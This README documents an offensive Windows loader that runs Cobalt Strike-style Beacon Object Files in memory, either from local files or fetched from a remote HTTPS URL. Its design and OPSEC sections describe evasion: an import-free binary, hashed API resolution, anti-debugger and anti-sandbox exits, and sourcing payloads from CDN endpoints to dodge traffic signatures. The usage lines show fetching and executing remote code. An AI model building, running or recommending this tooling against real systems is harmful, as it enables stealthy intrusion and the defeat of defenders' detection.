# remote_bof_loader

Standalone native x64 BOF (Beacon Object File / COFF) loader for Windows.

Loads `.o` files either from a local path or from a raw HTTPS URL, packs
operator arguments in the Cobalt Strike / Adaptix `i= s= z= Z= b=` format, and
executes the BOF in-process using a Beacon API stub table. Built with MinGW
`-nostdlib` so the resulting PE has **zero imports**; all APIs are resolved via
PEB walk with FNV1a-32 hashes.

## Build

Requires `x86_64-w64-mingw32-gcc`.

```bash
cd remote_bof_loader
python3 scripts/build.py
```

Output: `bin/bofloader.exe`

## Usage

Local file:

```batch
bofloader.exe --file env.x64.o --entry go --args "i=1 z=ntlm"
```

Raw HTTPS URL:

```batch
bofloader.exe --url https://lab.example.com/bofs/env.x64.o --ignore-cert
```

### Options

| Flag            | Description                                        |
|-----------------|----------------------------------------------------|
| `--file <path>` | Load BOF from a local file                         |
| `--url <url>`   | Fetch BOF over `https://`                          |
| `--entry <sym>` | Entry point symbol (default: `go`)                 |
| `--args <str>`  | Argument tokens (see below)                        |
| `--ignore-cert` | Ignore TLS certificate errors (lab only)           |
| `-h`, `--help`  | Show help                                          |

### Argument DSL (`--args`)

Tokens are space-separated. Each token is `type=value`.

| Type | Meaning                                  |
|------|------------------------------------------|
| `i=` | 32-bit signed integer                    |
| `s=` | 16-bit signed short                      |
| `z=` | Null-terminated ANSI string              |
| `Z=` | Null-terminated wide (UTF-16LE) string     |
| `b=` | Binary blob as hex (e.g. `b=414243`)     |

Example:

```batch
--args "i=1337 s=-1 z=hello Z=wide b=deadbeef"
```

## Design

- **No CRT / no imports**: custom `BofLoaderEntry`, no `main`, no `msvcrt`.
- **PEB API resolution**: walks `Ldr` lists, hashes module/function names with
  FNV1a-32. Hashes live in `src/hashes.h` and are regenerated by
  `scripts/gen_hashes.py`.
- **COFF loading**: parses the x64 COFF header, allocates each section via
  `NtAllocateVirtualMemory` as RW, copies raw data, resolves symbols, applies
  AMD64 relocations (ABSOLUTE, ADDR64, ADDR32NB, ADDR32, REL32…REL32_5), then
  flips executable sections to RX. Writable data sections stay RW.
- **External symbols**: resolves `Beacon*` API stubs, `MODULE$FUNCTION`
  imports, and bare `kernel32.dll!Function` fallbacks through `GetProcAddress`.
  64-bit external targets are referenced through a small internal IAT-slot table
  so they fit 32-bit REL32 displacements.
- **Unwind metadata**: if the BOF contains `.pdata`, it is registered with
  `RtlAddFunctionTable` and unregistered on cleanup.
- **Output capture**: `BeaconOutput` / `BeaconPrintf` are captured into a
  dynamically grown buffer and printed to stdout via `WriteFile`.
- **Anti-analysis**: quiet exit if the process is being debugged, has fewer
  than two processors, or has been running for less than ~3 minutes.

## Validation

```bash
python3 scripts/validate.py bin/bofloader.exe
```

Scans the compiled binary for:

- non-empty import table
- AMSI/ETW bypass strings
- plaintext HTTP strings
- RWX (`PAGE_EXECUTE_READWRITE`) patterns
- PowerShell / .NET / GitHub-API artifacts

## Tests

```bash
python3 tests/test_bof.py
```

Compiles `tests/test_bof.c`, builds the loader, runs `validate.py`, checks that
the import table is empty, and — if `wine` or `qemu-x86_64` is available —
runs the loader against the test BOF.

## OPSEC Notes

- Do **not** use `--ignore-cert` outside a lab. Production builds should require a
  valid TLS certificate.
- The loader intentionally has no embedded API names in the binary. Re-run
  `scripts/gen_hashes.py` if you add or remove resolved APIs.
- HTTPS fetch uses `winhttp.dll`, which is loaded on demand only when `--url` is
  used.
- Memory is allocated RW and transitioned to RX for code sections; no RWX pages
  are intentionally created.
- Source BOFs from raw HTTPS/CDN endpoints, not the GitHub API, to avoid
  signatured API traffic.

## Limitations

- x64 COFF BOFs only; x86 is not supported.
- The loader runs the BOF synchronously in the same thread; there is no timeout.
- Very complex multi-section BOFs with tight layout assumptions around unwind
  metadata may need the sections to land close together. Most real BOFs work
  fine with independent per-section allocations.
